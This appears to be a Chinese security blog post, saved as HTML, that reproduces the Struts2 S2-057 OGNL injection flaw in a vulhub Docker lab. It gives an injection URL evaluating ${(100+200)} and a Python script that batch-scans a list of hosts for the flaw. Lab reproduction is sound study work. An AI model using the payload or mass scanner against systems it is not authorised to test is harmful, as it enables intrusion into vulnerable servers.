@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>St2-057漏洞复现 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    603 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      3 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2019 , 八月 19日 星期一, 8:57 晚上</p>
+            
+            <div class="markdown-body">
+              <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行</p>
+<p>url标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行</p>
+<a id="more"></a>
+
+<hr>
+<h1 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h1><ul>
+<li><p>克隆vulhub</p>
+<pre><code>git clone https://github.com/vulhub/vulhub
+cd vulhub/struts2/s2-048
+docker-compose up -d
+docker ps    </code></pre></li>
+<li><p>进入docker<br><code>docker ps</code><br><img src="/images/%E6%BC%8F%E6%B4%9E/St2-057/dockerps.png" srcset="/img/loading.gif" alt=""></p>
+</li>
+</ul>
+<pre><code>docker exec -i -t &lt;你上面显示的CONTAINER ID &gt; /bin/bash</code></pre><ul>
+<li>根据公告（Struts 2.5.16存在s2-057漏洞，然后去下载这个版本）<blockquote>
+<p>Tips：在wget步骤可能会有点久，可以让他自己下载，看下电影去。。</p>
+</blockquote>
+</li>
+</ul>
+<pre><code>apt-get update -y
+mkdir /usr/local/tomcat/webapps/test
+wget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip
+apt-get install unzip -y
+unzip struts-2.5.16-all.zip
+cp struts-2.5.16/apps/struts2-showcase.war  /usr/local/tomcat/webapps/</code></pre><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p><code>/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml</code><br><code>/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml</code></p>
+<p>修改为</p>
+<pre><code>&lt;struts&gt;
+    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;
+        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;
+           &lt;result type=&quot;redirectAction&quot;&gt;
+             &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;
+           &lt;/result&gt;
+        &lt;/action&gt;
+    &lt;/package&gt;
+&lt;/struts&gt;</code></pre><p>两处修改完之后，重启服务</p>
+<pre><code>cd /usr/local/tomcat/bin/
+./shutdown.sh
+docker-compose up -d</code></pre><hr>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞利用大致分类</p>
+<ul>
+<li>数值计算<blockquote>
+<p><code>${(100+200)}</code> 可以在指定URL处计算<br><a href="http://192.168.28.130:8080/struts2-showcase/${(100+200)}/actionChain1.action" target="_blank" rel="noopener">http://192.168.28.130:8080/struts2-showcase/${(100+200)}/actionChain1.action</a></p>
+</blockquote>
+</li>
+<li>弹出计算器</li>
+<li>命令回显</li>
+</ul>
+<p>在这里，我只成功了数值计算，其他两个据说要在低版本才能执行<br>有兴趣的小伙伴，可以自行尝试</p>
+<p><img src="/images/%E6%BC%8F%E6%B4%9E/St2-057/1.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E6%BC%8F%E6%B4%9E/St2-057/2.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h1><pre><code class="python">import requests
+
+def scan(host):
+    payload = &#39;${(100+200)}&#39;
+    urls = &#39;http://%s/struts2-showcase/&#39; % (host)
+    url = urls + payload + &#39;/actionChain1.action&#39;
+    com = urls + &#39;300/register2.action&#39;
+    headers = {&#39;user-aget&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;}
+
+    try:
+        r = requests.get(url,headers,timeout=10)
+        if r.url == com:
+            print(&#39;Please wait...&#39;)
+            print(&#39;[+] St2-057：&#39;+r.url)
+        else:
+            print(&#39;[-] Not St2-057&#39;)
+    except Exception as e:
+        print(&#39;[-] Error：&#39;+com)
+
+if __name__ == &#39;__main__&#39;:
+    file_path = input(&#39;Path：&#39;)
+    host = [i.rstrip(&#39;\n&#39;) for i in open(file_path, &#39;r&#39;) if i != &#39;\n&#39;]
+
+    for i in host:
+        scan(i)</code></pre>
+<hr>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/Ivan1ee/struts2-057-exp" target="_blank" rel="noopener">https://github.com/Ivan1ee/struts2-057-exp</a><br><a href="https://github.com/jas502n/St2-057/" target="_blank" rel="noopener">https://github.com/jas502n/St2-057/</a><br><a href="https://bbs.ichunqiu.com/thread-44733-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44733-1-1.html</a><br><a href="https://422926799.github.io/2018/08/23/St2-057%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://422926799.github.io/2018/08/23/St2-057%E5%A4%8D%E7%8E%B0/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/08/19/%E6%BC%8F%E6%B4%9E/Linux/CVE-2017-16995/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>ubantu本地提权漏洞【CVE-2017-16995】</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/08/19/%E6%BC%8F%E6%B4%9E/eXtplorer/">
+                        <span>explorer绕过密码验证复现</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "St2-057漏洞复现&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
